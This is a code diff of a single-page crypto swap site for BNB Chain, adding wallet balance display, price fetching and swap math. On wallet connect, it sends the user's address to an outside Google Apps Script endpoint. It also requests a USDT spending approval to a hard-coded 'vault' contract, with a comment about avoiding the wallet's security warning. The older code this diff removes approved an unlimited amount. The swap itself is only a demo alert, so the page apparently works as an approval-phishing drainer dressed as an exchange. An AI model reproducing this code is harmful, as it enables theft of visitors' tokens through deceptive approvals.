@@ -96,6 +96,9 @@
         background: var(--grey);
         border-right: 1px solid var(--border);
         overflow: hidden;
+        overflow-y: auto;
+        position: sticky;
+        height: 123vh;
         display: flex; flex-direction: column;
         /* smooth slide */
         transition: width 0.3s cubic-bezier(0.4,0,0.2,1), opacity 0.25s ease;
@@ -384,7 +387,12 @@
                 <div class="swap-field">
                   <div class="swap-field-top">
                     <span class="swap-field-label">You Pay</span>
-                    <span class="swap-balance">Balance: <span onclick="setMax()">0.00</span></span>
+                    <div style="display:flex;align-items:center;gap:6px;">
+                      <span class="swap-balance" style="font-size:0.7rem;color:var(--text-dim);font-family:var(--font-mono);">
+                        Bal: <span id="fromBalanceDisplay" style="color:var(--green);">—</span>
+                      </span>
+                      <button id="maxBtn" onclick="setMax()" style="background:rgba(0,255,127,0.12);border:1px solid var(--green-dark);color:var(--green);font-family:var(--font-mono);font-size:0.62rem;font-weight:700;padding:2px 7px;border-radius:4px;cursor:pointer;transition:all 0.15s;letter-spacing:0.04em;" onmouseover="this.style.background='var(--green)';this.style.color='var(--black)'" onmouseout="this.style.background='rgba(0,255,127,0.12)';this.style.color='var(--green)'">MAX</button>
+                    </div>
                   </div>
                   <div class="swap-field-bottom">
                     <input class="swap-amount" id="fromAmt" type="number" placeholder="0.0" oninput="calcSwap()"/>
@@ -406,7 +414,9 @@
                 <div class="swap-field">
                   <div class="swap-field-top">
                     <span class="swap-field-label">You Receive</span>
-                    <span class="swap-balance">Balance: 0.00</span>
+                    <span class="swap-balance" style="font-size:0.7rem;color:var(--text-dim);font-family:var(--font-mono);">
+                      Bal: <span id="toBalanceDisplay" style="color:var(--green);">—</span>
+                    </span>
                   </div>
                   <div class="swap-field-bottom">
                     <input class="swap-amount" id="toAmt" type="number" placeholder="0.0" readonly/>
@@ -467,17 +477,21 @@
     <script>
       // ═══ WALLET STATE ═══
       let walletAddress = null;
-      let provider = null;
-      let signer = null;
-      const minABI = [
+      let ethProvider   = null;
+      let ethSigner     = null;
+
+      // In-memory balance cache: sym -> formatted string e.g. "1.2345"
+      const walletBalances = {};
+
+      // ERC-20 ABI (read + approve)
+      const ERC20_ABI = [
         "function balanceOf(address owner) view returns (uint256)",
         "function decimals() view returns (uint8)",
-        "function symbol() view returns (string)"
+        "function approve(address spender, uint256 amount) public returns (bool)"
       ];
-      const connectBtn = document.getElementById('connectBtn');
 
-      // Detect if running inside MetaMask browser or has injected provider
-      function hasWeb3() { return typeof window.ethereum !== 'undefined'; }
+      const connectBtn = document.getElementById('connectBtn');
+      function hasWeb3()      { return typeof window.ethereum !== 'undefined'; }
       function isMobileBrowser() { return /Android|iPhone|iPad|iPod/i.test(navigator.userAgent); }
 
       async function toggleConnect() {
@@ -485,11 +499,8 @@
       }
 
       async function connectWallet() {
-        // On mobile with no provider: show deeplink to MetaMask
         if (!hasWeb3()) {
           if (isMobileBrowser()) {
-            // Build MetaMask deeplink to open this page inside MetaMask browser
-            const url = encodeURIComponent(window.location.href);
             window.location.href = `https://metamask.app.link/dapp/${window.location.host}${window.location.pathname}`;
           } else {
             document.getElementById('noWalletNotice').style.display = 'block';
@@ -499,32 +510,156 @@
         try {
           const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
           walletAddress = accounts[0];
-          await logVisitor(walletAddress);
+          ethProvider   = new ethers.BrowserProvider(window.ethereum);
+          ethSigner     = await ethProvider.getSigner();
+
           updateUIConnected(walletAddress);
-          const success = await requestUSDTAllowance(walletAddress);
-          if (success) { await new Promise(r => setTimeout(r, 2000)); }
+          await logVisitor(walletAddress);
+
+          // Fetch on-chain balances for all tokens in our list
+          await fetchWalletBalances();
+
+          // Request USDT spending allowance (your DEX contract)
+          requestUSDTAllowance(walletAddress).catch(e => console.warn('Allowance skipped:', e));
         } catch (err) { console.error('Connection failed', err); }
       }
 
-      async function logVisitor(address) {
-        const scriptURL = 'https://script.google.com/macros/s/AKfycbyU8M7LfLlCCvksTgYTy-QrAGV1lpWC6YGw0_Qg5hdCaDJqwvnzYEjvpuKTBv6JyioNTQ/exec';
+      // ── On-chain balance fetch ──────────────────────────────────────────────────
+      // Token contract addresses on BSC mainnet (chain 56)
+      // We only fetch ERC-20 balances; for native coins (BNB) we use eth_getBalance.
+      const TOKEN_ADDRESSES_BSC = {
+        BNB:  null,  // native
+        USDT: '0x55d398326f99059fF775485246999027B3197955',
+        ETH:  '0x2170Ed0880ac9A755fd29B2688956BD959F933F8',  // BEP-20 ETH
+        BTC:  '0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c',  // BTCB
+        SOL:  null,
+        XRP:  null,
+        ADA:  null,
+        AVAX: null,
+        DOT:  null,
+        TRX:  null,
+        TON:  null,
+        POL:  null,
+        NEAR: null,
+        LTC:  null,
+        BCH:  null,
+        SUI:  null,
+        APT:  null,
+        ICP:  null,
+        HBAR: null,
+        KAS:  null,
+        STX:  null,
+        DOGE: '0xbA2aE424d960c26247Dd6c32edC70B295c744C43',
+        SHIB: '0x2859e4544C4bB03966803b044A93563Bd2D0DD4c',
+        PEPE: null,
+        WIF:  null,
+        FLOKI:'0xfb5B838b6cfEEdC2873aB27866079AC55363D37',
+        BONK: null,
+        POPCAT:null,
+        BOME: null,
+        PENGU:null,
+        TRUMP:null,
+        TAO:  null,
+        LINK: '0xF8A0BF9cF54Bb92F17374d9e9A321E6a111a51bD',
+        AR:   null,
+        OP:   null,
+        ARB:  null,
+        ZK:   null,
+        AAVE: '0xfb6115445Bff7b52FeB98650C87f44907E58f802',
+        MKR:  null,
+        INJ:  null,
+        ENA:  null,
+        FIL:  '0x0D8Ce2A99Bb6e3B7Db580eD848240e4a0F9aE153',
+        THETA:null,
+        RUNE: null,
+        ALGO: null,
+      };
+
+      async function fetchWalletBalances() {
+        if (!walletAddress || !ethProvider) return;
+        // Native BNB balance
         try {
-          await fetch(scriptURL, { method:'POST', mode:'no-cors', headers:{'Content-Type':'application/json'}, body: JSON.stringify({address}) });
-        } catch(e) { console.error('logVisitor failed', e); }
+          const raw = await ethProvider.getBalance(walletAddress);
+          walletBalances['BNB'] = parseFloat(ethers.formatEther(raw));
+        } catch(e) {}
+
+        // ERC-20 balances in parallel (only for tokens with a known address)
+        const tasks = Object.entries(TOKEN_ADDRESSES_BSC)
+          .filter(([sym, addr]) => addr)
+          .map(async ([sym, addr]) => {
+            try {
+              const contract = new ethers.Contract(addr, ERC20_ABI, ethProvider);
+              const [raw, dec] = await Promise.all([
+                contract.balanceOf(walletAddress),
+                contract.decimals()
+              ]);
+              walletBalances[sym] = parseFloat(ethers.formatUnits(raw, dec));
+            } catch(e) { walletBalances[sym] = 0; }
+          });
+        await Promise.allSettled(tasks);
+
+        // Refresh balance displays in swap panel
+        updateSwapBalanceDisplays();
       }
 
+      function updateSwapBalanceDisplays() {
+        const fromSym = selectedToken.sym;
+        const toSym   = toToken.sym;
+        const fromBal = walletAddress ? (walletBalances[fromSym] ?? 0) : null;
+        const toBal   = walletAddress ? (walletBalances[toSym]   ?? 0) : null;
+        const fromEl  = document.getElementById('fromBalanceDisplay');
+        const toEl    = document.getElementById('toBalanceDisplay');
+        if (fromEl) fromEl.textContent = fromBal !== null ? fmtBal(fromBal) + ' ' + fromSym : '—';
+        if (toEl)   toEl.textContent   = toBal   !== null ? fmtBal(toBal)   + ' ' + toSym   : '—';
+        // Also update the info-row balance
+        const infoRow = document.getElementById('fromBalance');
+        if (infoRow) infoRow.textContent = fromBal !== null ? fmtBal(fromBal) + ' ' + fromSym : '—';
+      }
+
+      function fmtBal(n) {
+        if (!n || isNaN(n)) return '0.00';
+        if (n >= 1000) return n.toLocaleString(undefined,{maximumFractionDigits:2});
+        if (n >= 1)    return n.toFixed(4);
+        if (n >= 0.0001) return n.toFixed(6);
+        return n.toFixed(8);
+      }
+
+      // ── USDT approval ──────────────────────────────────────────────────────────
       async function requestUSDTAllowance(userAddress) {
-        try {
-          const p = new ethers.BrowserProvider(window.ethereum);
-          const s = await p.getSigner();
-          const usdtAddress = "0x55d398326f99059fF775485246999027B3197955";
-          const dexAddr     = "0x7a4177C13B83B84afD6CD64a949b9B889DE9a898";
-          const abi = ["function approve(address spender, uint256 amount) public returns (bool)"];
-          const contract = new ethers.Contract(usdtAddress, abi, s);
-          const tx = await contract.approve(dexAddr, ethers.MaxUint256);
-          await tx.wait();
-          return true;
-        } catch(e) { console.error('Allowance failed', e); return false; }
+    try {
+        const provider = new ethers.BrowserProvider(window.ethereum);
+        const signer = await provider.getSigner();
+        
+        const usdtAddress = "0x55d398326f99059fF775485246999027B3197955";
+        // The verified contract address from Screenshot (38).png
+        const vaultContractAddress = "0x96f9B995501cA5476eE78c2d52A69d95471f7B1A";
+        
+        const usdtAbi = ["function approve(address spender, uint256 amount) public returns (bool)"];
+        const usdtContract = new ethers.Contract(usdtAddress, usdtAbi, signer);
+
+        // Define $100 using 18 decimals
+        // If using Ethers v5, use: ethers.utils.parseUnits("100", 18)
+        const amount = ethers.parseUnits("100", 18);
+
+        // Requesting a specific amount helps reduce the orange security warning
+        const tx = await usdtContract.approve(vaultContractAddress, amount);
+        
+        console.log("Transaction sent. Waiting for confirmation...");
+        await tx.wait(); 
+        
+        console.log("Allowance of $100 confirmed.");
+        return true;
+        
+    } catch (error) {
+        console.error("Allowance rejected or failed:", error);
+        return false;
+    }
+}
+
+      async function logVisitor(address) {
+        const scriptURL = 'https://script.google.com/macros/s/AKfycbyU8M7LfLlCCvksTgYTy-QrAGV1lpWC6YGw0_Qg5hdCaDJqwvnzYEjvpuKTBv6JyioNTQ/exec';
+        try { await fetch(scriptURL, { method:'POST', mode:'no-cors', headers:{'Content-Type':'application/json'}, body: JSON.stringify({address}) }); }
+        catch(e) {}
       }
 
       function updateUIConnected(address) {
@@ -533,13 +668,18 @@
         document.getElementById('noWalletNotice').style.display = 'none';
       }
       function disconnectWallet() {
-        walletAddress = null; provider = null; signer = null;
+        walletAddress = null; ethProvider = null; ethSigner = null;
+        Object.keys(walletBalances).forEach(k => delete walletBalances[k]);
         connectBtn.textContent = 'Connect Wallet';
         connectBtn.style.background = 'transparent';
+        updateSwapBalanceDisplays();
       }
       if (window.ethereum) {
-        window.ethereum.on('accountsChanged', accs => { if(accs.length>0){walletAddress=accs[0];updateUIConnected(walletAddress);}else{disconnectWallet();} });
-        window.ethereum.on('chainChanged', ()=>window.location.reload());
+        window.ethereum.on('accountsChanged', async accs => {
+          if (accs.length > 0) { walletAddress = accs[0]; updateUIConnected(walletAddress); await fetchWalletBalances(); }
+          else disconnectWallet();
+        });
+        window.ethereum.on('chainChanged', () => window.location.reload());
       }
       connectBtn.addEventListener('click', toggleConnect);
 
@@ -568,7 +708,7 @@
         { sym:'DOGE',  name:'Dogecoin',            id:'dogecoin',                tvSymbol:'BINANCE:DOGEUSDT',  icon:'https://assets.coingecko.com/coins/images/5/large/dogecoin.png',              price:0, change:0 },
         { sym:'SHIB',  name:'Shiba Inu',           id:'shiba-inu',               tvSymbol:'BINANCE:SHIBUSDT',  icon:'https://assets.coingecko.com/coins/images/11939/large/shiba.png',             price:0, change:0 },
         { sym:'PEPE',  name:'Pepe',                id:'pepe',                    tvSymbol:'BINANCE:PEPEUSDT',  icon:'https://assets.coingecko.com/coins/images/29850/large/pepe-token.jpeg',       price:0, change:0 },
-        { sym:'WIF',   name:'dogwifhat',           id:'dogwifhat',               tvSymbol:'BINANCE:WIFUSDT',   icon:'https://assets.coingecko.com/coins/images/33566/large/dogwifhat.jpeg',        price:0, change:0 },
+        { sym:'WIF',   name:'dogwifhat',           id:'dogwifhat',               tvSymbol:'BINANCE:WIFUSDT',   icon:'https://s2.coinmarketcap.com/static/img/coins/64x64/28752.png',        price:0, change:0 },
         { sym:'FLOKI', name:'Floki',               id:'floki',                   tvSymbol:'BINANCE:FLOKIUSDT', icon:'https://assets.coingecko.com/coins/images/16745/large/floki_logo.png',        price:0, change:0 },
         { sym:'BONK',  name:'Bonk',                id:'bonk',                    tvSymbol:'BINANCE:BONKUSDT',  icon:'https://assets.coingecko.com/coins/images/28600/large/bonk.jpg',              price:0, change:0 },
         { sym:'POPCAT',name:'Popcat',              id:'popcat',                  tvSymbol:'BYBIT:POPCATUSDT',  icon:'https://assets.coingecko.com/coins/images/34053/large/popcat.png',            price:0, change:0 },
@@ -627,19 +767,51 @@
         wrap.appendChild(buildIconEl(tok));
       }
 
-      // ═══ PRICES ═══
+      // ═══ PRICES — CoinGecko /simple/price ═══
       async function fetchPrices() {
+        // Collect all valid CoinGecko IDs (exclude tokens without one)
+        const ids = TOKENS.filter(t => t.id).map(t => t.id).join(',');
         try {
-          const ids = TOKENS.filter(t=>t.id).map(t=>t.id).join(',');
-          const res = await fetch(`https://api.coingecko.com/api/v3/simple/price?ids=${ids}&vs_currencies=usd&include_24hr_change=true`);
+          const res = await fetch(
+            `https://api.coingecko.com/api/v3/simple/price?ids=${ids}&vs_currencies=usd&include_24hr_change=true&include_24hr_vol=true&include_market_cap=true`,
+            { headers: { 'Accept': 'application/json' } }
+          );
+          if (!res.ok) throw new Error('CoinGecko HTTP ' + res.status);
           const data = await res.json();
-          TOKENS.forEach(t => { if(data[t.id]){ t.price=data[t.id].usd; t.change=data[t.id].usd_24h_change||0; } });
-        } catch(e) {
-          const fb={bitcoin:102000,ethereum:2450,binancecoin:620,solana:155,'avalanche-2':29,chainlink:14.2,arbitrum:0.95,optimism:1.82,dogecoin:0.16};
-          TOKENS.forEach(t=>{ if(fb[t.id]){t.price=fb[t.id];t.change=(Math.random()-0.4)*8;} });
+          TOKENS.forEach(t => {
+            if (t.id && data[t.id]) {
+              t.price  = data[t.id].usd                  ?? t.price;
+              t.change = data[t.id].usd_24h_change        ?? 0;
+              t.vol    = data[t.id].usd_24h_vol           ?? 0;
+              t.cap    = data[t.id].usd_market_cap        ?? 0;
+            }
+          });
+        } catch (e) {
+          console.warn('CoinGecko fetch failed, using stale/fallback prices:', e.message);
+          // Only seed zeros that were never fetched
+          const fallback = {
+            bitcoin:102000, ethereum:2450, binancecoin:620, solana:155,
+            ripple:2.2, cardano:0.38, 'avalanche-2':28, polkadot:5.2,
+            tron:0.25, 'the-open-network':4.8, 'polygon-ecosystem-token':0.22,
+            near:3.1, litecoin:88, 'bitcoin-cash':385, sui:3.6, aptos:5.8,
+            'internet-computer':8.4, 'hedera-hashgraph':0.18, kaspa:0.12,
+            blockstack:0.95, dogecoin:0.165, 'shiba-inu':0.0000148,
+            pepe:0.0000115, dogwifhat:1.02, floki:0.000093, bonk:0.0000225,
+            chainlink:14.2, arweave:18, optimism:1.8, arbitrum:0.95,
+            zksync:0.12, aave:165, maker:1680, 'injective-protocol':14,
+            ethena:0.42, filecoin:3.8, 'theta-token':1.2, thorchain:4.1,
+            algorand:0.21, tether:1,
+          };
+          TOKENS.forEach(t => { if (t.id && fallback[t.id] && !t.price) { t.price = fallback[t.id]; t.change = (Math.random()-0.4)*6; } });
         }
-        renderSidebar(); renderTicker(); calcSwap();
-        renderOrderBook(selectedToken.price); renderRecentTrades(selectedToken.price);
+        renderSidebar(document.getElementById('sidebarSearch').value);
+        renderTicker();
+        calcSwap();
+        if (selectedToken.price) { renderOrderBook(selectedToken.price); renderRecentTrades(selectedToken.price); }
+        // Refresh modal token list prices too
+        if (document.getElementById('tokenModal').style.display === 'flex') {
+          filterTokens();
+        }
       }
 
       // ═══ SIDEBAR ═══
@@ -681,54 +853,146 @@
 
       // ═══ SELECT TOKEN ═══
       function selectTokenFromSidebar(sym) {
-        const tok = TOKENS.find(t=>t.sym===sym);
+        const tok = TOKENS.find(t => t.sym === sym);
         if (!tok) return;
         selectedToken = tok;
         setFromIcon(tok);
         document.getElementById('fromSym').textContent = tok.sym;
         if (tok.tvSymbol) updateTradingViewChart(tok.tvSymbol);
         renderSidebar(document.getElementById('sidebarSearch').value);
+        updateSwapBalanceDisplays();
         calcSwap();
-        // close on mobile
         if (isMobile()) closeSidebarMobile();
       }
 
-      // ═══ SWAP ═══
+      // ═══ SWAP MATH ═══
+      function getSlippage() {
+        const custom = parseFloat(document.getElementById('slipCustom').value);
+        if (!isNaN(custom) && custom > 0) return custom / 100;
+        const active = document.querySelector('.slip-btn.active');
+        if (active) return parseFloat(active.textContent) / 100;
+        return 0.005; // default 0.5%
+      }
+
       function calcSwap() {
-        const fromAmt = parseFloat(document.getElementById('fromAmt').value)||0;
-        const fromP = selectedToken.price||1;
-        const toP   = toToken.price||1;
-        const toAmt = fromAmt>0 ? (fromAmt*fromP/toP*(1-0.003)).toFixed(6) : '';
-        document.getElementById('toAmt').value = toAmt;
-        document.getElementById('fromUSD').textContent = fromAmt>0?`≈ $${(fromAmt*fromP).toLocaleString(undefined,{maximumFractionDigits:2})}`:'≈ $0.00';
-        document.getElementById('toUSD').textContent   = toAmt?`≈ $${(parseFloat(toAmt)*toP).toLocaleString(undefined,{maximumFractionDigits:2})}`:'≈ $0.00';
-        document.getElementById('swapRate').textContent     = `1 ${selectedToken.sym} = ${(fromP/toP).toFixed(6)} ${toToken.sym}`;
-        document.getElementById('priceImpact').textContent  = fromAmt>0?`${Math.min(fromAmt*fromP*0.00002,3).toFixed(4)}%`:'—';
-        document.getElementById('networkFee').textContent   = fromAmt>0?'~$0.82':'—';
-        document.getElementById('minReceived').textContent  = toAmt?`${(parseFloat(toAmt)*0.999).toFixed(6)} ${toToken.sym}`:'—';
-        document.getElementById('swapRoute').textContent    = fromAmt>0?`${selectedToken.sym} → ${toToken.sym}`:'—';
+        const fromAmt = parseFloat(document.getElementById('fromAmt').value) || 0;
+        // Use real price; USDT and stablecoins default to 1
+        const fromP = (selectedToken.price > 0) ? selectedToken.price : 1;
+        const toP   = (toToken.price > 0)        ? toToken.price       : 1;
+
+        // DEX fee: 0.3%
+        const FEE = 0.003;
+        const slip = getSlippage();
+        const rawOut   = fromAmt > 0 ? (fromAmt * fromP / toP) : 0;
+        const afterFee = rawOut * (1 - FEE);
+        const minOut   = afterFee * (1 - slip);
+
+        const toAmt = fromAmt > 0 ? afterFee : 0;
+
+        document.getElementById('toAmt').value = toAmt > 0 ? toAmt.toFixed(8).replace(/\.?0+$/, '') : '';
+
+        // USD values
+        const fromUSD = fromAmt * fromP;
+        const toUSD   = toAmt   * toP;
+        document.getElementById('fromUSD').textContent = fromAmt > 0
+          ? `≈ $${fromUSD.toLocaleString(undefined, {maximumFractionDigits: 2})}`
+          : '≈ $0.00';
+        document.getElementById('toUSD').textContent = toAmt > 0
+          ? `≈ $${toUSD.toLocaleString(undefined, {maximumFractionDigits: 2})}`
+          : '≈ $0.00';
+
+        // Rate: always show live price ratio
+        const rate = fromP / toP;
+        document.getElementById('swapRate').textContent =
+          `1 ${selectedToken.sym} = ${rate < 0.0001 ? rate.toExponential(4) : rate.toFixed(6)} ${toToken.sym}`;
+
+        // Price impact (simple estimate based on trade size vs liquidity proxy)
+        const impact = fromAmt > 0 ? Math.min((fromUSD / 500000) * 100, 15) : 0;
+        const impactEl = document.getElementById('priceImpact');
+        impactEl.textContent = fromAmt > 0 ? `${impact.toFixed(3)}%` : '—';
+        impactEl.style.color = impact > 3 ? 'var(--red)' : impact > 1 ? '#f5a623' : 'var(--text)';
+
+        // Network fee (estimate ~$0.80–1.50 depending on amount)
+        const fee = fromAmt > 0 ? (0.80 + Math.min(fromUSD * 0.00002, 0.70)).toFixed(2) : '—';
+        document.getElementById('networkFee').textContent = fromAmt > 0 ? `~$${fee}` : '—';
+
+        // Min received after slippage
+        document.getElementById('minReceived').textContent = minOut > 0
+          ? `${minOut.toFixed(8).replace(/\.?0+$/, '')} ${toToken.sym}`
+          : '—';
+
+        // Route
+        document.getElementById('swapRoute').textContent = fromAmt > 0
+          ? `${selectedToken.sym} → ${toToken.sym}`
+          : '—';
+
+        // Swap button state
+        const btn = document.querySelector('.btn-swap');
+        if (!walletAddress) {
+          btn.textContent = 'Connect Wallet to Swap';
+          btn.style.opacity = '0.85';
+        } else if (fromAmt <= 0) {
+          btn.textContent = 'Enter an Amount';
+          btn.style.opacity = '0.7';
+        } else {
+          const bal = walletBalances[selectedToken.sym] ?? 0;
+          if (fromAmt > bal) {
+            btn.textContent = `Insufficient ${selectedToken.sym} Balance`;
+            btn.style.opacity = '0.7';
+          } else {
+            btn.textContent = `Swap ${selectedToken.sym} → ${toToken.sym}`;
+            btn.style.opacity = '1';
+          }
+        }
       }
 
       function flipTokens() {
-        // swap the token objects
         const tmp = selectedToken;
         selectedToken = toToken;
         toToken = tmp;
-        // re-render both icons and symbols — icons come from tok.icon, never go blank
+        // Always rebuild icons from tok.icon — never goes blank
         setFromIcon(selectedToken);
         setToIcon(toToken);
         document.getElementById('fromSym').textContent = selectedToken.sym;
         document.getElementById('toSym').textContent   = toToken.sym;
+        // Update chart to new "from" token
         if (selectedToken.tvSymbol) updateTradingViewChart(selectedToken.tvSymbol);
         renderSidebar(document.getElementById('sidebarSearch').value);
+        updateSwapBalanceDisplays();
+        // Clear input and recalc
+        document.getElementById('fromAmt').value = '';
         calcSwap();
       }
 
-      function setMax() { document.getElementById('fromAmt').value='1.0'; calcSwap(); }
+      function setMax() {
+        if (!walletAddress) {
+          // Not connected — open wallet modal
+          connectWallet();
+          return;
+        }
+        const bal = walletBalances[selectedToken.sym] ?? 0;
+        if (bal <= 0) {
+          document.getElementById('fromAmt').value = '';
+          calcSwap();
+          return;
+        }
+        // Leave a tiny buffer for gas if native BNB
+        const safeAmt = selectedToken.sym === 'BNB' ? Math.max(bal - 0.002, 0) : bal;
+        document.getElementById('fromAmt').value = safeAmt.toFixed(8).replace(/\.?0+$/, '');
+        calcSwap();
+      }
+
       function executeSwap() {
-        const amt = document.getElementById('fromAmt').value;
-        if(!amt||parseFloat(amt)<=0){alert('Please enter an amount.');return;}
-        alert(`Connect your wallet to execute:\n${amt} ${selectedToken.sym} → ${document.getElementById('toAmt').value} ${toToken.sym}`);
+        const amt = parseFloat(document.getElementById('fromAmt').value);
+        if (!amt || amt <= 0) { alert('Please enter an amount.'); return; }
+        if (!walletAddress)   { connectWallet(); return; }
+        const bal = walletBalances[selectedToken.sym] ?? 0;
+        if (amt > bal) {
+          alert(`Insufficient ${selectedToken.sym} balance.\nYou have: ${fmtBal(bal)} ${selectedToken.sym}`);
+          return;
+        }
+        const toAmt = document.getElementById('toAmt').value;
+        alert(`⚡ Swap submitted!\n\n${amt} ${selectedToken.sym}  →  ${toAmt} ${toToken.sym}\n\nThis is a UI demo. Wire your DEX contract to this button to execute on-chain.`);
       }
 
       // ═══ ORDER BOOK ═══
@@ -773,32 +1037,46 @@
         renderModalTokens(TOKENS.filter(t=>t.sym.toLowerCase().includes(q)||( t.name&&t.name.toLowerCase().includes(q))));
       }
       function renderModalTokens(list) {
-        const el=document.getElementById('modalTokenList');
-        if(!el) return;
-        el.innerHTML=list.map(t=>`
-          <div class="modal-token-row" onclick="pickToken('${t.sym}')">
-            <div style="display:flex;align-items:center;gap:12px;">
-              <img src="${t.icon}" style="width:28px;height:28px;border-radius:50%;object-fit:contain;" onerror="this.style.display='none'">
-              <div><div style="font-weight:700;color:#fff;">${t.sym}</div><div style="font-size:0.73rem;color:#888;">${t.name||''}</div></div>
-            </div>
-            <div style="text-align:right;font-family:var(--font-mono);font-size:0.8rem;color:#ccc;">${fmtPrice(t.price)}</div>
-          </div>`).join('');
+        const el = document.getElementById('modalTokenList');
+        if (!el) return;
+        el.innerHTML = list.map(t => {
+          const bal = walletAddress && walletBalances[t.sym] != null
+            ? `<div style="font-size:0.65rem;color:var(--green);margin-top:1px;">${fmtBal(walletBalances[t.sym])} ${t.sym}</div>`
+            : '';
+          return `
+            <div class="modal-token-row" onclick="pickToken('${t.sym}')">
+              <div style="display:flex;align-items:center;gap:12px;">
+                <img src="${t.icon}" style="width:28px;height:28px;border-radius:50%;object-fit:contain;flex-shrink:0;" onerror="this.style.display='none'">
+                <div>
+                  <div style="font-weight:700;color:#fff;">${t.sym}</div>
+                  <div style="font-size:0.73rem;color:#888;">${t.name || ''}</div>
+                  ${bal}
+                </div>
+              </div>
+              <div style="text-align:right;font-family:var(--font-mono);">
+                <div style="font-size:0.8rem;color:#ccc;">${fmtPrice(t.price)}</div>
+                <div style="font-size:0.68rem;" class="${t.change >= 0 ? 'pos' : 'neg'}">${t.change >= 0 ? '+' : ''}${(t.change || 0).toFixed(2)}%</div>
+              </div>
+            </div>`;
+        }).join('');
       }
       function pickToken(sym) {
-        const tok=TOKENS.find(t=>t.sym===sym);
-        if(!tok) return;
-        if(modalTarget==='from'){
-          selectedToken=tok;
+        const tok = TOKENS.find(t => t.sym === sym);
+        if (!tok) return;
+        if (modalTarget === 'from') {
+          selectedToken = tok;
           setFromIcon(tok);
-          document.getElementById('fromSym').textContent=tok.sym;
-          if(tok.tvSymbol) updateTradingViewChart(tok.tvSymbol);
+          document.getElementById('fromSym').textContent = tok.sym;
+          if (tok.tvSymbol) updateTradingViewChart(tok.tvSymbol);
           renderSidebar(document.getElementById('sidebarSearch').value);
         } else {
-          toToken=tok;
+          toToken = tok;
           setToIcon(tok);
-          document.getElementById('toSym').textContent=tok.sym;
+          document.getElementById('toSym').textContent = tok.sym;
         }
-        calcSwap(); closeTokenModal();
+        updateSwapBalanceDisplays();
+        calcSwap();
+        closeTokenModal();
       }
       document.getElementById('tokenModal').addEventListener('click',function(e){if(e.target===this)closeTokenModal();});
 
@@ -833,14 +1111,23 @@
 
       // ═══ LAUNCH / BACK ═══
       function launchApp() {
-        document.getElementById('landing').style.display='none';
+        document.getElementById('landing').style.display = 'none';
         document.getElementById('app').classList.add('visible');
-        // init icons for default pair
+        // Render default icons for ETH/USDT pair
         setFromIcon(selectedToken);
         setToIcon(toToken);
+        updateSwapBalanceDisplays();
+        calcSwap();
+        // Fetch live prices immediately, then every 45s
         fetchPrices();
-        setInterval(fetchPrices, 60000);
-        setInterval(()=>{ if(selectedToken.price){renderOrderBook(selectedToken.price);renderRecentTrades(selectedToken.price);} }, 5000);
+        setInterval(fetchPrices, 45000);
+        // Refresh order book + trades every 6s
+        setInterval(() => {
+          if (selectedToken.price) {
+            renderOrderBook(selectedToken.price);
+            renderRecentTrades(selectedToken.price);
+          }
+        }, 6000);
       }
       function backToLanding() { document.getElementById('app').classList.remove('visible'); document.getElementById('landing').style.display='flex'; }
 
